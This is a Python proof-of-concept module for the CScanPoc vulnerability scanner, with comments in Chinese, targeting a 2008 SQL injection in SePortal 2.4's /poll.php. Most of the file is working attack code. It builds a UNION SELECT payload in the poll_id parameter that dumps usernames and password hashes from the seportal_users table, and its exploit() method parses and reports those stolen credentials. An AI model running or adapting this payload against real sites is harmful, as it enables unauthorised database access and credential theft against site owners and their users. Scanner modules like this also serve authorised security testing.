# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'SePortal_0000'  # 平台漏洞编号，留空
    name = 'SePortal 2.4 /poll.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2008-06-29'  # 漏洞公布时间
    desc = '''
        SePortal是一个Weblog管理系统。
        SePortal 2.4 /poll.php SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-8867'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'SePortal'  # 漏洞应用名称
    product_version = '2.4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '01ae9f59-b2cf-4ddc-8264-7094d6e22bf9'
    author = '国光'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ('1\'%20union%20select%201,convert(concat_ws(0x3a3a,0x3A3A33763537,user_name,user_password,'
                       '0x616536393A3A)+using+latin1),1,1,1,1,1,1,1,1%20from%20seportal_users%20limit%201,1--%20z')

            verify_url = '{target}'.format(
                target=self.target)+'/poll.php?poll_id='+payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            u_p = re.findall('::3v57::(.*?)::(.*?)::ae69::', content)
            if u_p:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            payload = ('1\'%20union%20select%201,convert(concat_ws(0x3a3a,0x3A3A33763537,user_name,user_password,'
                       '0x616536393A3A)+using+latin1),1,1,1,1,1,1,1,1%20from%20seportal_users%20limit%201,1--%20z')
            verify_url = '{target}'.format(
                target=self.target)+'/poll.php?poll_id='+payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            u_p = re.findall('::3v57::(.*?)::(.*?)::ae69::', content)
            if u_p:
                (username, password) = u_p[0]
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 用户密码为{password}'.format(
                    target=self.target, name=self.vuln.name, username=username, password=password))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
